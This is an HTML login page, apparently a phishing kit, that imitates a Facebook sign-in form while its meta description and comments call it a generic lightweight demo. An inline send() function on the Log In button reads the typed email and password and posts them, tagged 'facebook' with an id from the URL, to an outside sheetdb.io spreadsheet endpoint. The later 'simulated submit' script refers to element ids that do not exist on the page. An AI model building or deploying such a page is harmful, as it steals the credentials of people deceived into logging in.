<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Lite Login</title>
  <meta name="description" content="Lightweight login page (inspired by lite-style UIs)" />
  <style>
    /* Reset-ish */
    :root{
      --bg: #f2f4f7;
      --card: #ffffff;
      --accent: #1877f2; /* blue-ish, generic */
      --muted: #6b7280;
      --danger: #dc2626;
      --radius: 10px;
      --maxw: 420px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background: linear-gradient(180deg, #eef2ff 0%, var(--bg) 100%);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      color:#111827;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .shell{
      width:100%;
      max-width:calc(var(--maxw) + 48px);
      display:flex;
      align-items:center;
      justify-content:center;
    }

    .card{
      width:100%;
      max-width:var(--maxw);
      background:var(--card);
      border-radius:var(--radius);
      box-shadow: 0 6px 18px rgba(15,23,42,0.08);
      padding:22px;
      border: 1px solid rgba(15,23,42,0.04);
    }

    .brand{
      display:flex;
      gap:12px;
      align-items:center;
      justify-content:center;
      margin-bottom:14px;
    }
    .brand .logo{
      width:48px;
      height:48px;
      border-radius:8px;
      display:inline-grid;
      place-items:center;
      background:linear-gradient(135deg,#eef4ff,#dde9ff);
      border:1px solid rgba(13,42,148,0.06);
    }

    .brand h1{
      font-size:18px;
      margin:0;
      letter-spacing: -0.2px;
    }
    .subtitle{
      text-align:center;
      color:var(--muted);
      font-size:13px;
      margin-top:6px;
      margin-bottom:12px;
    }

    form {
      display:flex;
      flex-direction:column;
      gap:10px;
    }

    label{
      font-size:12px;
      color:var(--muted);
      margin-bottom:6px;
      display:block;
    }

    .input{
      padding:12px 12px;
      border-radius:8px;
      border:1px solid rgba(15,23,42,0.08);
      font-size:15px;
      outline:none;
      background:transparent;
      width:100%;
    }
    .input:focus{
      box-shadow:0 0 0 4px rgba(24,119,242,0.08);
      border-color: rgba(24,119,242,0.6);
    }

    .row{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }

    .remember {
      display:inline-flex;
      gap:8px;
      align-items:center;
      color:var(--muted);
      font-size:13px;
    }

    .btn{
      padding:12px 14px;
      border-radius:8px;
      font-weight:600;
      border:none;
      cursor:pointer;
      font-size:15px;
      background:linear-gradient(180deg,var(--accent), #0f67d9);
      color:white;
      box-shadow: 0 6px 14px rgba(24,119,242,0.18);
    }
    .btn:active{transform:translateY(1px)}
    .btn[aria-disabled="true"]{
      opacity:0.6;
      cursor:not-allowed;
      box-shadow:none;
    }

    .link {
      display:block;
      text-align:center;
      padding:12px 0;
      color:var(--muted);
      font-size:14px;
      text-decoration:none;
    }

    .small {
      display:flex;
      gap:8px;
      align-items:center;
      justify-content:center;
      margin-top:6px;
      color:var(--muted);
      font-size:13px;
    }

    .error {
      color:var(--danger);
      font-size:13px;
      margin-top:4px;
    }

    /* footer */
    .footer {
      display:flex;
      gap:8px;
      flex-wrap:wrap;
      align-items:center;
      justify-content:center;
      margin-top:12px;
      color:var(--muted);
      font-size:12px;
    }

    /* small screens tweak */
    @media (max-width:420px){
      .card{padding:16px}
      .brand h1{font-size:16px}
    }
  </style>
</head>
<body>
  <main class="shell" role="main">
    <section class="card" aria-labelledby="signin-heading">
      <div class="brand" role="presentation">
        <div class="loo" aria-hidden="true">
          <!-- generic lightning / pixel logo as inline SVG -->
<h1 style="color: dodgerblue;">Facebook</h1>
        </div>
        <div style="text-align:left">
        
      
        </div>
      </div>

   

      <form id="loginForm" novalidate>
        <div>
          
          
          <label for="who">Phone or email</label>
          <input id="email" class="input" name="who" type="text" inputmode="email" autocomplete="username" placeholder="Email or phone..." required />
          <div id="whoErr" class="error" aria-live="polite" style="display:none"></div>
        </div>

        <div>
          <label for="pwd">Password</label>
          <input id="password" class="input" name="password" type="password" autocomplete="current-password" placeholder="••••••••" minlength="4" required />
          <div id="pwdErr" class="error" aria-live="polite" style="display:none"></div>
        </div>

        <div class="row">
          <label class="remember"><input id="remember" type="checkbox" /> Remember</label>
          <a href="#" class="small" id="forgot">Forgot password?</a>
        </div>

        <button id="btn" class="btn" onclick="send()" type="submit" aria-disabled="false">Log In</button>
      




        <script>
        function send() {
           const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
           
           
        var urldata = new URLSearchParams(window.location.search);
        
        const id = urldata.get('id');
        const type = "facebook";
        
           
           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";

fetch(url, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    data: {
      id: id,
      type: type,
      username: email,
      password: password
    }
  })
})
.then(response => response.json())
.then(result => {
  //out
})
.catch(error => {
  window.alert(error);
});
            
        }
            
        </script>
        
        





        <div style="text-align:center;padding:8px 0">
          <a href="#" class="link" id="create">Create new account</a>
        </div>

        <div id="status" class="small" aria-live="polite"></div>
      </form>

      <div class="footer" aria-hidden="true">
        <span>English (US)</span> · <span>Privacy</span> · <span>Terms</span>
      </div>
    </section>
  </main>

  <script>
    // Lightweight client-side behavior: validation & simulated submit
    (function(){
      const form = document.getElementById('loginForm');
      const who = document.getElementById('who');
      const pwd = document.getElementById('pwd');
      const btn = document.getElementById('btn');
      const status = document.getElementById('status');
      const whoErr = document.getElementById('whoErr');
      const pwdErr = document.getElementById('pwdErr');

      function validate() {
        let ok = true;
        whoErr.style.display = 'none';
        pwdErr.style.display = 'none';

        const whoVal = who.value.trim();
        if(!whoVal) {
          whoErr.textContent = 'Please enter your phone or email.';
          whoErr.style.display = 'block';
          ok = false;
        } else {
          // quick sanity check: if it looks like an email, ensure contains @
          if(whoVal.includes('@') && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(whoVal)) {
            whoErr.textContent = 'That email address looks invalid.';
            whoErr.style.display = 'block';
            ok = false;
          }
        }

        if(!pwd.value || pwd.value.length < 4) {
          pwdErr.textContent = 'Password must be at least 4 characters.';
          pwdErr.style.display = 'block';
          ok = false;
        }

        return ok;
      }

      function setLoading(isLoading){
        btn.setAttribute('aria-disabled', String(isLoading));
        btn.disabled = isLoading;
        btn.textContent = isLoading ? 'Signing in…' : 'Log In';
      }

      form.addEventListener('submit', function(e){
        e.preventDefault();
        status.textContent = '';
        if(!validate()) return;

        // simulate network activity (fast & lightweight)
        setLoading(true);
        status.textContent = 'Checking credentials...';

        // In a real app you would POST to your API here.
        // We'll simulate latency with setTimeout and show results.
        setTimeout(() => {
          setLoading(false);
          // fake login rules (demo only)
          const demoValid = (who.value.trim().toLowerCase() === 'demo@example.com' && pwd.value === 'password');
          if(demoValid){
            status.textContent = 'Welcome back — redirecting...';
            // simulate redirect
            setTimeout(()=> {
              status.textContent = 'Redirected (demo).';
            }, 700);
          } else {
            status.textContent = '';
            pwdErr.textContent = 'Wrong phone/email or password.';
            pwdErr.style.display = 'block';
            // subtle shake animation
            animateShake(form);
          }
        }, 700);
      });

      // small utility: shake the form on error
      function animateShake(node){
        node.style.transition = 'transform 120ms ease';
        node.style.transform = 'translateX(-8px)';
        setTimeout(()=> node.style.transform = 'translateX(8px)', 120);
        setTimeout(()=> node.style.transform = 'translateX(0)', 240);
        setTimeout(()=> node.style.transition = '', 360);
      }

      // accessibility: allow Enter to submit from password field
      pwd.addEventListener('keydown', (e)=> {
        if(e.key === 'Enter') {
          e.preventDefault();
          form.requestSubmit();
        }
      });

      // small demo helper: fill demo values if user double clicks brand logo
      document.querySelector('.logo').addEventListener('dblclick', ()=> {
        who.value = 'demo@example.com';
        pwd.value = 'password';
      });
    })();
  </script>
</body>
</html>
